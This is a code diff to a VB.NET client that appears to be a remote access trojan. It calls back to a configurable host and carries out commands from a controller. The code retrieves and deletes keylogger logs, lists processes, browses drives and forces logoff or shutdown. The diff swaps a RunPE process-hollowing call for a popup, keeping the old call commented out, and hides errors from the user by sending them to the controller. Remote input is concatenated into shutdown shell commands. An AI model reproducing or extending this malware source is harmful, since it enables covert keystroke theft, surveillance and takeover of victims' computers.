@@ -133,6 +133,11 @@ Public Class Main
     Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
     Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32
     Private Declare Function LockWorkStation Lib "user32.dll" () As Long
+    <DllImport("wtsapi32.dll", SetLastError:=True)>
+    Private Shared Function WTSSendMessage(ByVal hServer As IntPtr, ByVal SessionId As Int32, ByVal title As String, ByVal titleLength As UInt32, ByVal message As String, ByVal messageLength As UInt32, ByVal style As UInt32, ByVal timeout As UInt32, ByRef pResponse As UInt32, ByVal bWait As Boolean) As Boolean
+    End Function
+    Public Shared WTS_CURRENT_SERVER_HANDLE As IntPtr = IntPtr.Zero
+    Public Shared WTS_CURRENT_SESSION As Integer = -1
 #End Region
 
     ''' <summary>
@@ -156,7 +161,7 @@ Public Class Main
         ''temporary preferences
         HOST = "127.0.0.1" ''IP
         port = 92 ''Port
-        name = "Wonder_1" ''Client Name (unique!)
+        name = "Wonder" ''Client Name
         copyse = False ''Copy (to temp)
         'serfol = alaa(5)
         sernam = "null" ''copy name (server name)
@@ -449,16 +454,20 @@ B:
                         keybd_event(A(1), 0, A(2), 0)
                     Case n.close ''exit instance
                         End
+                    Case n.openpower
+                        C.Send(n.openpower)
                     Case n.logoff ''log off
                         Shell("shutdown -l -t 0", AppWinStyle.Hide)
                     Case n.sleep ''sleep
                         Application.SetSuspendState(PowerState.Suspend, True, False)
                     Case n.restart ''restart
-                        Shell("shutdown -r -t 0", AppWinStyle.Hide)
+                        Shell("shutdown -r " & A(1), AppWinStyle.Hide)
                     Case n.shutdown ''shut down
-                        Shell("shutdown -s -t 0", AppWinStyle.Hide) ''TODO: TEST THESE! and check for alternatives to force shutdown.
+                        Shell("shutdown -s " & A(1), AppWinStyle.Hide) ''TODO: TEST THESE! and check for alternatives to force shutdown.
                     Case n.lock ''lock
                         LockWorkStation
+                    Case n.abort ''abort shutdown
+                        Shell("shutdown -a", AppWinStyle.Hide)
                     Case n.getdrives
                         C.Send(n.getfileman & Sep & getDrives())
                     Case n.getfileman
@@ -504,8 +513,8 @@ B:
                         Dim cparr_pid As String() ''cpu array pid
                         Dim cparr_percent As String() ''cpu array percent
 
-                        Dim clres As ManagementObjectCollection = New ManagementObjectSearcher("SELECT CommandLine, ProcessId FROM Win32_Process").Get
-                        Dim cpres As ManagementObjectCollection = New ManagementObjectSearcher("SELECT IDProcess, PercentProcessorTime FROM Win32_PerfFormattedData_PerfProc_Process").Get
+                        Dim clres As ManagementObjectCollection = New ManagementObjectSearcher("Select CommandLine, ProcessId FROM Win32_Process").Get
+                        Dim cpres As ManagementObjectCollection = New ManagementObjectSearcher("Select IDProcess, PercentProcessorTime FROM Win32_PerfFormattedData_PerfProc_Process").Get
 
                         Dim query = "SELECT * FROM Win32_Processor"
                         Dim num_cores As Integer = 0
@@ -531,7 +540,7 @@ B:
                                 i += 1
                             Next
                         Catch ex As Exception
-                            MsgBox(ex.Message)
+                            C.Send(n.exception & Sep & ex.Message)
                         End Try
 
                         Try
@@ -550,11 +559,11 @@ B:
                                 i += 1
                             Next
                         Catch ex As Exception
-                            MsgBox(ex.Message)
+                            C.Send(n.exception & Sep & ex.Message)
                         End Try
 
                         For Each Proc As Process In ProcessList
-                            InfoLabel.Text = "proc: " & Proc.ProcessName
+                            InfoLabel.Text = "proc:  " & Proc.ProcessName
 
                             If Proc.Responding Then
                                 responding = ""
@@ -584,7 +593,7 @@ B:
                                     i += 1
                                 Next
                             Catch ex As Exception
-                                MsgBox(ex.Message & vbNewLine & ex.StackTrace)
+                                C.Send(n.exception & Sep & ex.Message)
                                 cp = "0"
                             End Try
 
@@ -669,7 +678,9 @@ B:
                     Case n.getklog ''ket keylogs
                         Try
                             C.Send(n.getklog & Sep & o.Logs)
-                        Catch : End Try
+                        Catch ex As Exception
+                            C.Send(n.exception & Sep & ex.Message)
+                        End Try
                     Case n.delklog
                         o.Close(False)
                         Dim di As New DirectoryInfo(Application.StartupPath)
@@ -681,7 +692,7 @@ B:
                                     fri.Delete()
                                 End If
                             Catch ex As Exception
-
+                                C.Send(n.exception & Sep & ex.Message)
                             End Try
                         Next fri
                         o = New KLogger
@@ -689,9 +700,11 @@ B:
                         C.Send(n.delklog)
                     Case n.message ''show message
                         Try
-                            RunPE.Run("C:\Program Files (x86)\Internet Explorer\iexplore.exe", "@#@" & A(1) & "@#@" & A(2), My.Resources.MessageMaker, False) ''ToDO Change path!
+                            WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, " ", 1, A(1), A(1).Length, A(2), Nothing, Nothing, False)
+                            ''RunPE.Run("C:\Program Files (x86)\Internet Explorer\iexplore.exe", "@#@" & A(1) & "@#@" & A(2), My.Resources.MessageMaker, False) ''ToDO Change path!
                         Catch ex As Exception
-                            MsgBox("RunPE fail: " & ex.Message) ''todo: remove
+                            C.Send(n.exception & Sep & ex.Message)
+                            ''MsgBox("RunPE fail: " & ex.Message) ''todo: remove
                         End Try
 
                     Case n.getspecs ''system specs TODO!
@@ -828,11 +841,9 @@ B:
         Try
             ''todo add https
             response = WRequest("http://" & HOST & "/index.php", "0x1", "POST", "id=" & Crypt.AES.Encrypt(name, "hinki", Crypt.AES.salt, "SHA1", 1000, Crypt.AES.IV, 256) & "&iv=" & Crypt.AES.IV)
-        Catch ex As Exception
-            MsgBox(ex.Message)
-        End Try
+        Catch : End Try
         ''MsgBox(response)
-        Me.InfoLabel.Text = response
+        Me.InfoLabel.Text = "WebRequest: " & response
     End Sub
 
     ''' <summary>
